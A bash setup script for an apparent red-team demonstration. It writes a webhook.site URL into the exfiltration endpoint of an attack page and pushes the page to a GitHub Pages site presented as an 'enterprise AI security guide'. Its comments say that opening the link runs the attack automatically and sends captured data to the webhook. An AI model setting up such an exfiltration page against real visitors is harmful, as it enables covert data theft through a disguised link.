#!/bin/bash
# ============================================================================
# Red Team Demo Setup Script
# ============================================================================
# This script configures the exfiltration webhook URL in the attack page.
#
# USAGE:
#   1. Go to https://webhook.site in YOUR browser (not the CEO's)
#   2. Copy the unique URL it gives you
#   3. Run: ./setup.sh "https://webhook.site/YOUR-UNIQUE-ID"
#   4. The script commits and pushes the update to GitHub Pages
#
# DEMO FLOW:
#   - You open https://webhook.site/#!/YOUR-UNIQUE-ID to watch incoming data
#   - CEO opens https://nishantshekhar2.github.io/enterprise-ai-security-guide/
#   - Attack runs automatically, data appears on webhook.site in real-time
#   - Everything the attack captures is also displayed on the CEO's screen
# ============================================================================

if [ -z "$1" ]; then
  echo "Usage: ./setup.sh \"https://webhook.site/YOUR-UNIQUE-ID\""
  echo ""
  echo "Steps:"
  echo "  1. Open https://webhook.site in your browser"
  echo "  2. Copy the unique URL shown at the top"
  echo "  3. Run this script with that URL"
  exit 1
fi

WEBHOOK_URL="$1"
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"

echo "[*] Setting exfiltration endpoint to: $WEBHOOK_URL"

# Update the EXFIL_ENDPOINT in index.html
sed -i '' "s|const EXFIL_ENDPOINT = \".*\";|const EXFIL_ENDPOINT = \"${WEBHOOK_URL}\";|" "$SCRIPT_DIR/index.html"

echo "[*] Updated index.html"

# Commit and push
cd "$SCRIPT_DIR"
git add index.html
git commit -m "Configure exfiltration endpoint"
git push origin main

echo ""
echo "[+] Done! GitHub Pages will update in ~30 seconds."
echo ""
echo "DEMO INSTRUCTIONS:"
echo "  1. Open this URL to monitor incoming data:"
echo "     ${WEBHOOK_URL/webhook.site/webhook.site/#!/}"
echo ""
echo "  2. Share this link with the CEO:"
echo "     https://nishantshekhar2.github.io/enterprise-ai-security-guide/"
echo ""
echo "  3. When the CEO opens it, the attack runs automatically."
echo "     Stolen data appears on webhook.site AND on the CEO's screen."
